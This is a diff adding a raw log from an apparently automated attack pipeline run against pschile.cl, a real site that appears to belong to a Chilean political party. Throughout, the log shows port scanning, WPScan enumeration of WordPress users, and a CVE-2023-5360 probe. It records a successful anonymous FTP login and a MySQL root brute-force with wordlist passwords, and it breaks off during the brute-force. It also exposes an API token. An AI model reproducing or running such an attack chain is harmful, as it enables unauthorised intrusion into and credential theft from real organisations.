@@ -1,0 +1,183 @@
+===== DNS RESOLUTION =====
+[DNS] pschile.cl → 162.241.218.115
+
+[SCAN] pschile.cl (162.241.218.115) — TOP 100
+[DEBUG] Waiting for 61 threads...
+  [HIGH] Port 21 (FTP) — OPEN
+  [LOW] Port 25 (SMTP) — OPEN
+  [LOW] Port 1723 (Unknown) — OPEN
+  [LOW] Port 22 (SSH) — OPEN
+  [HIGH] Port 2222 (SSH) — OPEN
+  [LOW] Port 143 (IMAP) — OPEN
+  [LOW] Port 465 (Unknown) — OPEN
+  [LOW] Port 993 (Unknown) — OPEN
+  [LOW] Port 995 (Unknown) — OPEN
+  [LOW] Port 443 (HTTPS) — OPEN
+  [LOW] Port 587 (Unknown) — OPEN
+  [HIGH] Port 2083 (cPanel) — OPEN
+  [LOW] Port 53 (DNS) — OPEN
+  [LOW] Port 80 (HTTP) — OPEN
+  [LOW] Port 110 (POP3) — OPEN
+  [LOW] Port 2096 (Unknown) — OPEN
+  [HIGH] Port 3306 (MySQL) — OPEN
+  [HIGH] Port 5432 (PostgreSQL) — OPEN
+[DEBUG] Done. Open ports: 18
+
+===== SCAN SUMMARY =====
+
+[pschiel] pschile.cl (162.241.218.115)
+  Port    21 (FTP            ) — HIGH
+  Port    22 (SSH            ) — LOW
+  Port    25 (SMTP           ) — LOW
+  Port    53 (DNS            ) — LOW
+  Port    80 (HTTP           ) — LOW
+  Port   110 (POP3           ) — LOW
+  Port   143 (IMAP           ) — LOW
+  Port   443 (HTTPS          ) — LOW
+  Port   465 (Unknown        ) — LOW
+  Port   587 (Unknown        ) — LOW
+  Port   993 (Unknown        ) — LOW
+  Port   995 (Unknown        ) — LOW
+  Port  1723 (Unknown        ) — LOW
+  Port  2083 (cPanel         ) — HIGH
+  Port  2096 (Unknown        ) — LOW
+  Port  2222 (SSH            ) — HIGH
+  Port  3306 (MySQL          ) — HIGH
+  Port  5432 (PostgreSQL     ) — HIGH
+
+[EXPORT] Results saved to reports/results.json
+[EXPORT] Results appended to reports/results.csv
+
+[ROUTER] Checking extractors for pschile.cl (162.241.218.115)
+  [CDN] pschile.cl is not behind Cloudflare — skipping bypass
+
+  [WPScan] Targeting https://www.pschile.cl
+  [WPScan] Running: wpscan --url https://www.pschile.cl --format json --no-update --disable-tls-checks --ignore-main-redirect --enumerate u,p,t --api-token nL5IQBV8aZTVXP4hXdEZWAUrhkSG0axd2foMGUc4SNs
+  [WPScan] WordPress version: 6.9.1
+  [WPScan] Users found: ['Partido Socialista De Chile', 'admin-2']
+  [WPScan] Interesting: [headers] https://www.pschile.cl/
+  [WPScan] Interesting: [robots_txt] https://www.pschile.cl/robots.txt
+  [WPScan] Interesting: [readme] https://www.pschile.cl/readme.html
+  [WPScan] Interesting: [mu_plugins] https://www.pschile.cl/wp-content/mu-plugins/
+  [WPScan] Interesting: [wp_cron] https://www.pschile.cl/wp-cron.php
+  [WPScan] Scan complete — 0 total vulnerabilities found
+  [ROUTER] Injected 2 WPScan user(s) into credential pool
+
+  [Nikto] Targeting www.pschile.cl:443
+  [Nikto] Running: nikto -host www.pschile.cl -port 443 -Format csv -nointeractive -Tuning x9 -timeout 10 -ssl
+  [Nikto] Scan complete — 0 findings (0 HIGH, 0 MEDIUM, 0 INFO)
+
+  [CVE-2023-5360] Targeting https://www.pschile.cl
+  [CVE-2023-5360] No WprConfig nonce found — plugin likely not installed or patched
+
+  [cPanel] Targeting pschile.cl:2083
+  [cPanel] Could not reach login page
+  [MATCH] Port 21 (FTP) — launching extractor
+  [FTP] Connecting to 162.241.218.115:21
+  [FTP] Banner: 220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 3 of 150 allowed.
+220-Local time is now 08:49. Server port: 21.
+220 You will be disconnected after 15 minutes of inactivity.
+  [FTP] CRITICAL — anonymous login succeeded
+  [SKIP] Port 22 (SSH) — credentials already found
+  [SKIP] Port 25 (SMTP) — no extractor available
+  [SKIP] Port 53 (DNS) — no extractor available
+  [SKIP] Port 80 (HTTP) — no extractor available
+  [SKIP] Port 110 (POP3) — no extractor available
+  [SKIP] Port 143 (IMAP) — no extractor available
+  [SKIP] Port 443 (HTTPS) — no extractor available
+  [SKIP] Port 465 (Unknown) — no extractor available
+  [SKIP] Port 587 (Unknown) — no extractor available
+  [SKIP] Port 993 (Unknown) — no extractor available
+  [SKIP] Port 995 (Unknown) — no extractor available
+  [SKIP] Port 1723 (Unknown) — no extractor available
+  [SKIP] Port 2083 (cPanel) — no extractor available
+  [SKIP] Port 2096 (Unknown) — no extractor available
+  [SKIP] Port 2222 (SSH) — credentials already found
+  [MATCH] Port 3306 (MySQL) — launching extractor
+  [MySQL] Connecting to 162.241.218.115:3306
+  [MySQL] Version: unknown
+  [MySQL] Loaded 3 entries from user-10-million-usernames-dup.txt
+  [MySQL] Loaded 716 entries from pass-10-million-passwords-1000000.txt
+  [MySQL] Testing 2148 combinations...
+  [MySQL] Error testing root:root: no_salt
+  [MySQL] Error testing root:admin: no_salt
+  [MySQL] Error testing root:1234: no_salt
+  [MySQL] Error testing root:user: no_salt
+  [MySQL] Error testing root:Administrator: no_salt
+  [MySQL] Error testing root:administrador: no_salt
+  [MySQL] Error testing root:usuario2: no_salt
+  [MySQL] Error testing root:usuario: no_salt
+  [MySQL] Error testing root:user4: no_salt
+  [MySQL] Error testing root:user3: no_salt
+  [MySQL] Error testing root:user2: no_salt
+  [MySQL] Error testing root:user1: no_salt
+  [MySQL] Error testing root:12345: no_salt
+  [MySQL] Error testing root:123456: no_salt
+  [MySQL] Error testing root:daemon: no_salt
+  [MySQL] Error testing root:bin: no_salt
+  [MySQL] Error testing root:sys: no_salt
+  [MySQL] Error testing root:sync: no_salt
+  [MySQL] Error testing root:games: no_salt
+  [MySQL] Error testing root:man: no_salt
+  [MySQL] Error testing root:lp: no_salt
+  [MySQL] Error testing root:mail: no_salt
+  [MySQL] Error testing root:news: no_salt
+  [MySQL] Error testing root:uucp: no_salt
+  [MySQL] Error testing root:proxy: no_salt
+  [MySQL] Error testing root:www-data: no_salt
+  [MySQL] Error testing root:backup: no_salt
+  [MySQL] Error testing root:nobody: no_salt
+  [MySQL] Error testing root:a: no_salt
+  [MySQL] Error testing root:welcome123: no_salt
+  [MySQL] Error testing root:welcome: no_salt
+  [MySQL] Error testing root:webmaster: no_salt
+  [MySQL] Error testing root:webadmin: no_salt
+  [MySQL] Error testing root:vision: no_salt
+  [MySQL] Error testing root:valentin: no_salt
+  [MySQL] Error testing root:uuidd: no_salt
+  [MySQL] Error testing root:uploader: no_salt
+  [MySQL] Error testing root:unknown: no_salt
+  [MySQL] Error testing root:ubuntu: no_salt
+  [MySQL] Error testing root:ubnt: no_salt
+  [MySQL] Error testing root:trustno1: no_salt
+  [MySQL] Error testing root:toor: no_salt
+  [MySQL] Error testing root:tomcat: no_salt
+  [MySQL] Error testing root:thomas: no_salt
+  [MySQL] Error testing root:testtest: no_salt
+  [MySQL] Error testing root:test123: no_salt
+  [MySQL] Error testing root:test: no_salt
+  [MySQL] Error testing root:temptemp: no_salt
+  [MySQL] Error testing root:temporary: no_salt
+  [MySQL] Error testing root:temporal: no_salt
+  [MySQL] Error testing root:temp123: no_salt
+  [MySQL] Error testing root:tang: no_salt
+  [MySQL] Error testing root:systemadministrator: no_salt
+  [MySQL] Error testing root:systemadmin: no_salt
+  [MySQL] Error testing root:system32: no_salt
+  [MySQL] Error testing root:system: no_salt
+  [MySQL] Error testing root:sysadmin: no_salt
+  [MySQL] Error testing root:sys: no_salt
+  [MySQL] Error testing root:sybase: no_salt
+  [MySQL] Error testing root:support: no_salt
+  [MySQL] Error testing root:supervisor: no_salt
+  [MySQL] Error testing root:superuser: no_salt
+  [MySQL] Error testing root:supernic.cn: no_salt
+  [MySQL] Error testing root:superadmin: no_salt
+  [MySQL] Error testing root:super: no_salt
+  [MySQL] Error testing root:sunshine: no_salt
+  [MySQL] Error testing root:sudo: no_salt
+  [MySQL] Error testing root:student: no_salt
+  [MySQL] Error testing root:start123: no_salt
+  [MySQL] Error testing root:sshd: no_salt
+  [MySQL] Error testing root:soporte: no_salt
+  [MySQL] Error testing root:soadmin: no_salt
+  [MySQL] Error testing root:siadmin: no_salt
+  [MySQL] Error testing root:shisp.com: no_salt
+  [MySQL] Error testing root:shirley: no_salt
+  [MySQL] Error testing root:share: no_salt
+  [MySQL] Error testing root:shangdi: no_salt
+  [MySQL] Error testing root:shadow: no_salt
+  [MySQL] Error testing root:server: no_salt
+  [MySQL] Error testing root:security: no_salt
+  [MySQL] Error testing root:secure: no_salt
